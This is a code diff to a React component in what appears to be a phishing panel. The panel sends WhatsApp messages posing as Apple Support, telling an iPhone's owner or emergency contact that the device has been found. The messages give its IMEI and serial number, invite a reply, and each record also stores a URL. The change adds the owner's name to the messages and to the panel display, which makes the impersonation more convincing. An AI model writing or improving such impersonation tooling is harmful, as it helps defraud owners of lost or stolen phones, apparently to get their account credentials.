@@ -12,6 +12,7 @@ interface Process {
   country_code: string;
   phone_number: string;
   contact_type: string;
+  owner_name: string | null; // Nuevo campo
   iphone_model: string;
   storage: string;
   color: string;
@@ -184,7 +185,21 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
       let message = '';
       
       if (process.contact_type === 'propietario') {
-        message = `*Soporte de Apple 👨🏽‍🔧*
+        if (process.owner_name) {
+          message = `*Soporte de Apple 👨🏽‍🔧*
+
+*✅ iPhone localizado con éxito*
+*👤 Propietario: ${process.owner_name}*
+
+*📱 Modelo:* ${process.iphone_model}
+*💾 Almacenamiento:* ${process.storage}
+*🎨 Color:* ${process.color}
+*📟 IMEI:* ${process.imei}
+*🔑 Serie:* ${process.serial_number}
+
+*🧾 Escribe la palabra Menu para solicitar asistencia.*`;
+        } else {
+          message = `*Soporte de Apple 👨🏽‍🔧*
 
 *✅ iPhone localizado con éxito*
 
@@ -195,8 +210,24 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
 *🔑 Serie:* ${process.serial_number}
 
 *🧾 Escribe la palabra Menu para solicitar asistencia.*`;
+        }
       } else {
-        message = `*Soporte de Apple 👨🏽‍🔧*
+        if (process.owner_name) {
+          message = `*Soporte de Apple 👨🏽‍🔧*
+
+*🚨 Eres un contacto de emergencia de ${process.owner_name}*
+
+*✅ iPhone localizado con éxito*
+
+*📱 Modelo:* ${process.iphone_model}
+*💾 Almacenamiento:* ${process.storage}
+*🎨 Color:* ${process.color}
+*📟 IMEI:* ${process.imei}
+*🔑 Serie:* ${process.serial_number}
+
+*🧾 Escribe la palabra Menu para solicitar asistencia.*`;
+        } else {
+          message = `*Soporte de Apple 👨🏽‍🔧*
 
 *🚨 Usted ha sido registrado como contacto de emergencia.*
 
@@ -209,6 +240,7 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
 *🔑 Serie:* ${process.serial_number}
 
 *🧾 Escribe la palabra Menu para solicitar asistencia.*`;
+        }
       }
 
       // Enviar mensaje via WhatsApp API
@@ -358,6 +390,11 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
                     <p className="text-blue-200/70 text-sm">
                       {process.country_code} {process.phone_number} ({process.contact_type})
                     </p>
+                    {process.owner_name && (
+                      <p className="text-blue-200/60 text-xs mt-1">
+                        {process.contact_type === 'propietario' ? 'Propietario' : 'Contacto de emergencia de'}: {process.owner_name}
+                      </p>
+                    )}
                   </div>
                   <div className="flex items-center space-x-2">
                     <Badge 
@@ -422,6 +459,14 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
                     <p className="text-blue-200/50">Tipo de Contacto:</p>
                     <p className="text-blue-200">{process.contact_type}</p>
                   </div>
+                  {process.owner_name && (
+                    <div>
+                      <p className="text-blue-200/50">
+                        {process.contact_type === 'propietario' ? 'Propietario:' : 'Contacto de emergencia de:'}
+                      </p>
+                      <p className="text-blue-200">{process.owner_name}</p>
+                    </div>
+                  )}
                   {process.url && (
                     <div className="md:col-span-2 lg:col-span-3">
                       <p className="text-blue-200/50">URL:</p>
